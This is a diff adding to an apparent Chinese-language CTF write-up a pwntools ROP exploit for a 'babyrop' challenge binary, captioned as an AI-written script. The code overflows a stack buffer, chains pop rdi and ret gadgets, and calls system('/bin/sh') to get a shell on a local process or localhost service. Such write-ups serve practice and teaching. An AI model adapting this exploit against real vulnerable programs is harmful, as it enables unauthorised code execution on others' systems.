@@ -54,3 +54,40 @@ p.recvuntil(b"What's your name? ")
 p.send(payload)
 p.interactive()
 ```
+
+AI 完成的攻击脚本，思路和上面是一样的：
+
+```python
+from pwn import *
+
+context.arch = 'amd64'
+context.os = 'linux'
+
+elf = ELF('./babyrop')
+
+import sys
+LOCAL = '--remote' not in sys.argv
+
+if LOCAL:
+    p = process('./babyrop')
+else:
+    p = remote('localhost', 9999)
+
+# Gadgets
+pop_rdi = 0x400683
+ret = 0x400479
+
+bin_sh = next(elf.search(b'/bin/sh'))
+system_plt = elf.plt['system']
+
+# Stack: [buf 16] [saved rbp 8] [ret addr]
+payload = b'A' * 16  # fill buffer
+payload += b'B' * 8   # saved rbp
+payload += p64(ret)       # stack alignment
+payload += p64(pop_rdi)   # pop rdi; ret
+payload += p64(bin_sh)    # rdi = "/bin/sh"
+payload += p64(system_plt)  # system("/bin/sh")
+
+p.sendline(payload)
+p.interactive()
+```
